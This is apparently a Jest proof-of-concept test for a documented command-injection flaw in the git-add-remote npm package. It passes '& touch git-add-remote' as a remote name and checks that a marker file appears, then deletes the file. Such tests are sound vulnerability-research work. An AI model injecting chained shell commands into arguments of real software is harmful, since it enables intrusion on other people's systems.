//https://snyk.io/vuln/SNYK-JS-GITADDREMOTE-564269
test("Command Injection in git-add-remote", () => 
{
	const root = require("git-add-remote")();
	const fs = require('fs');
	const path = './git-add-remote';
	const sleep = require('sleep');
	let payload = "& touch git-add-remote";

	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	root(payload,'',function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});